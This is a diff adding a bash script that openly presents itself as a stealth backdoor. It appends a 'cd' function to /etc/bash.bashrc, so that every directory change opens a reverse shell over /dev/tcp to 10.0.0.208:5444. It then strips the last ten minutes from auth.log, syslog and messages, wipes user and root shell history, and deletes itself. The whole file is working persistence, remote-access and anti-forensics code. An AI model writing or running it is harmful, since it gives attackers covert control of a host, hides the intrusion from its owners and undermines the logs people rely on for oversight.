@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# === Stealth Reverse Shell Hook for 'cd' ===
+# Reverse shell: 10.0.0.208:5444
+# Injects into /etc/bash.bashrc and erases its own traces afterward
+
+HOOK_PORT=5444
+CALLBACK_IP="10.0.0.208"
+TARGET_BASHRC="/etc/bash.bashrc"
+
+echo "[+] Installing stealth 'cd' hook..."
+
+# Only install if not already present
+if grep -q "# cd hook" "$TARGET_BASHRC"; then
+    echo "[*] Hook already exists. Skipping..."
+    exit 0
+fi
+
+# Append stealth reverse shell function for 'cd'
+cat <<EOF >> "$TARGET_BASHRC"
+
+# cd hook
+cd() {
+  bash -c "python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1" 2>/dev/null & disown
+  builtin cd "\$@"
+}
+EOF
+
+echo "[+] Hook injected into $TARGET_BASHRC"
+
+# === Stealth Measures ===
+
+echo "[*] Dynamically scrubbing logs from the past 10 minutes..."
+
+# Get current time and 10 minutes ago as epoch
+now_epoch=$(date +%s)
+cutoff_epoch=$(date -d '10 minutes ago' +%s)
+
+clean_log() {
+  local log="$1"
+  [ ! -f "$log" ] && return
+
+  awk -v now="$now_epoch" -v cutoff="$cutoff_epoch" '
+  function parse_ts(month, day, time_str,   cmd, ts) {
+    cmd = "date -d \"" month " " day " " time_str "\" +%s"
+    cmd | getline ts
+    close(cmd)
+    return ts
+  }
+  {
+    # Match syslog-style timestamp: e.g., "Apr 19 15:22:01"
+    if ($1 ~ /^[A-Z][a-z]{2}$/ && $2 ~ /^[0-9]{1,2}$/ && $3 ~ /^[0-9]{2}:[0-9]{2}:[0-9]{2}$/) {
+      log_time = parse_ts($1, $2, $3)
+      if (log_time < cutoff || log_time > now) print $0
+    } else {
+      print $0
+    }
+  }
+  ' "$log" > "$log.tmp" && mv "$log.tmp" "$log"
+}
+
+clean_log /var/log/auth.log
+clean_log /var/log/syslog
+clean_log /var/log/messages
+
+# Clear current session history
+export HISTFILE=~/.bash_history
+history -c
+rm -f ~/.bash_history 2>/dev/null
+rm -f /root/.bash_history 2>/dev/null
+
+echo "[+] Log cleanup complete."
+
+# === Self-destruct the script after execution ===
+
+echo "[*] Self-destructing..."
+SCRIPT_PATH="$0"
+rm -f "$SCRIPT_PATH"
+unset SCRIPT_PATH
+history -d $(history 1) 2>/dev/null
+
+echo "[+] Script has removed itself."
